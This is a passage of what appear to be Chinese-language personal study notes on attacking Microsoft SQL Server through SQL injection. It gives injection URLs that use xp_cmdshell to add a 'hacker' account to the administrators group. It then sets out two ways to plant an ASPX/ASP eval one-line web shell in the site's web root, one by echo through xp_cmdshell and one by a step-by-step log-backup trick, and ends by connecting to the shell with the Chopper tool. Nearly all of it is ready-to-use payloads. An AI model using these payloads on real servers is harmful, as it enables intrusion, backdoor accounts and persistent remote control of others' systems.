asp?id=3;exec master.dbo.xp_cmdshell 'net user hacker 123456 /add'<br />XP_CMDSHELL把用户hacker加到ADMIN组：<br />asp?id=3;exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'<br /> <br />学习的文档：[https://www.lagou.com/lgeduarticle/38721.html](https://www.lagou.com/lgeduarticle/38721.html)<br />[https://www.cnblogs.com/vigarbuaa/p/3371500.html](https://www.cnblogs.com/vigarbuaa/p/3371500.html)<br />[https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html](https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html)<br />[https://blog.csdn.net/weixin_34319999/article/details/92479895](https://blog.csdn.net/weixin_34319999/article/details/92479895)<br /> 
<a name="xhHv3"></a>
## 拿shell方法
前提：<br />1具备sa或者dbo权限<br />2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）<br /> 
<a name="Q5PqT"></a>
### (2)xp_cmdshell拿shell
 <br />1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\aufeng.aspx' ;<br /> 
<a name="b9sxu"></a>
### (2)差异备份拿shell
大概思路：<br /> <br />假设：http://xxxxx/show.aspx?code=1<br />中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\<br /> <br />(1) 修改数据库设置为恢复模式<br />http://xxxxx/show.asp?code=1’;alter database abc set RECOVERY FULL –<br />完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。<br /> <br />(2) 备份当前数据库日志到文件<br />http://xxxxx/show.aspx?code=1’;backup log abc to disk=‘e:\xampp\htdocs\dvwa’ with init –<br />备份数据库日志到服务器上，其中路径是网页的物理路径。<br /> <br />(3) 建立一张表和一个字段<br />http://xxxxx/show.aspx?code=1’;create table tt(a text) –<br /> <br />(4) 往表中插入一句话马子<br />http://xxxxx/show.asp?code=1’;insert into tt(a) values(’<%eval request(“abc”) %>’) –<br />values中的内容一般转换为马子的hex值。<br /> <br />(5) 再次备份日志<br />http://xxxxx/show.asp?code=1’;backup log ahykd_new to disk=‘e:\xampp\htdocs\dvwa\1.aspx’ –<br />再次备份日志，备份路径为网站服务器的物理路径<br /> <br />(6) 删除表<br />http://xxxxx/show.aspx?code=1’;drop table tt –<br /> <br />然后菜刀尝试连接http://xxxxx/1.aspx<br /> 
